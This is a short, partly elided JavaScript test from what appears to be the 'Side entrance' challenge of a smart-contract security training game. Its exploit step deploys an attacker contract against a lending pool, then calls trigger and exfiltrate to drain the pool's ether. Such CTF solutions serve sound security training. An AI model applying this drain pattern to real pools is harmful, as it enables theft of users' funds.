...
describe('[Challenge] Side entrance', function () {
    ...
    it('Exploit', async function () {
        ...
        console.log(ETHER_IN_POOL);

        const SideEntranceAttackerFactory = await ethers.getContractFactory('SideEntranceAttacker', attacker);
        const attacker_helper = await SideEntranceAttackerFactory.deploy(attacker.address, this.pool.address);

        await attacker_helper.trigger(ETHER_IN_POOL);
        await attacker_helper.exfiltrate();
    });
